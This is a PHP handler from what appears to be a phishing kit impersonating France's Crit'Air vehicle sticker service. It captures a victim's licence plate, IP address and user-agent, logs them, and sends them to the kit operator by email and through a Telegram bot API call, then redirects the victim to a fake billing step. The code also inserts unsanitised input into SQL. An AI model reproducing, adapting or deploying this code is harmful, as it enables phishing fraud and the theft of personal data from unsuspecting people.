<?php
session_start();
include('../../dashboard/settings.php');
$base = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
$base->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
if(isset($_SESSION['authorized']))
{
	if(isset($_POST['continue']))
	{
		$_SESSION['plaqueim'] = $_POST['plaqueim'];
		$plaqueim = $_SESSION['plaqueim'];
		$ip = $_SERVER['REMOTE_ADDR'];
		if(strlen($_SESSION['plaqueim']) >= 9)
		{
		$stmt = $base->prepare('SELECT * FROM settings');   
        $stmt->setFetchMode(PDO::FETCH_ASSOC);
        $stmt->execute();
        $rows = $stmt->fetchAll();

        foreach ($rows as $row) {

          if($row['wplaque'] == "0"){
          	$base->exec("INSERT INTO logs (plaque,ip) VALUES('$plaqueim','$ip')");
          	header('Location: ../loading.php?bring=billing');
          }
          else{
			$base->exec("INSERT INTO logs (plaque,ip) VALUES('$plaqueim','$ip')");
			$message = "
[🚘] LOGIN [🚘]

🚘 Plaque d'immatriculation : ".$_SESSION['plaqueim']."

[🌐] TIERS [🌐]

🌐 Adresse IP : ".$ip."
🌐 User-Agent : ".$_SERVER['HTTP_USER_AGENT']."

			";

			$subject = "=?UTF-8?B?4oyK8J+amOKMiSBMT0dJTiBDUklUXCdBSVI=?= - ".$_SESSION['plaqueim']." - ".$ip;
			$entete = "From : =?UTF-8?B?4pm777iPIENyaXRcJ0FpciDimbvvuI8=?= <reach@author-secured.com>";
			if($row['wmail'] == "1")
			{
				mail($row['rezmail'],$subject,$message,$entete);
			}

			if($row['wtelegram'] == "1")
			{
				$chat_id = $row['chatid'];
				$bot_token = $row['bottoken'];
				$data = ['text' => $message,'chat_id' => $chat_id];
                file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
			}

			header('Location: ../loading.php?bring=billing');

          }
		}



		}
		else{
			header('Location: ../informations-vehicule.php?error=true');
		}
	}
	else{
		header('Location: ../informations-vehicule.php?&enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
	}
}
else{
die("LA REQUÊTE A ÉTÉ REFUSÉE : VÉRIFIEZ QUE VOUS N'ÊTES PAS CONNECTÉ À UN RÉSEAU PRIVÉ" );   
}
?>